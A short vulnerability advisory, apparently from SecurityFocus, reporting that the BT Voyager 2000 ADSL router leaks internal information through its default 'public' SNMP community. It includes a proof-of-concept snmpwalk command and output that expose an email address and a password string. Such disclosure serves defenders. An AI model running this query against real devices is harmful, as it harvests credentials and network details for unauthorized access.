source: https://www.securityfocus.com/bid/10589/info

BT Voyager 2000 Wireless ADSL Router is reported prone to a sensitive information disclosure vulnerability.

It is reported that 'public' SNMP MIB community strings which, are world readable by default contain sensitive information pertaining to the internal protected network.

Data collected by exploiting this vulnerability may be used in further attacks against the victim network. 

root@abyrvalg:~# snmpwalk -v 1 -c public 192.168.1.1
SNMPv2-MIB::sysDescr.0 = STRING: BT Voyager 2000 Wireless ADSL Router
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.2535.111.6
SNMPv2-MIB::sysUpTime.0 = Timeticks: (260430184) 30 days, 1:02:01.84
[snip]
SNMPv2-SMI::transmission.23.2.3.1.5.5.1 = STRING:
"name.surname@btbroadband.com"
SNMPv2-SMI::transmission.23.2.3.1.5.6.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.5.7.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.5.8.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.5.9.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.5.10.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.5.11.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.5.12.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.1 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.2 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.3 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.4 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.5 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.6 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.7 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.0.8 = ""
SNMPv2-SMI::transmission.23.2.3.1.6.5.1 = STRING: "password"
[snip]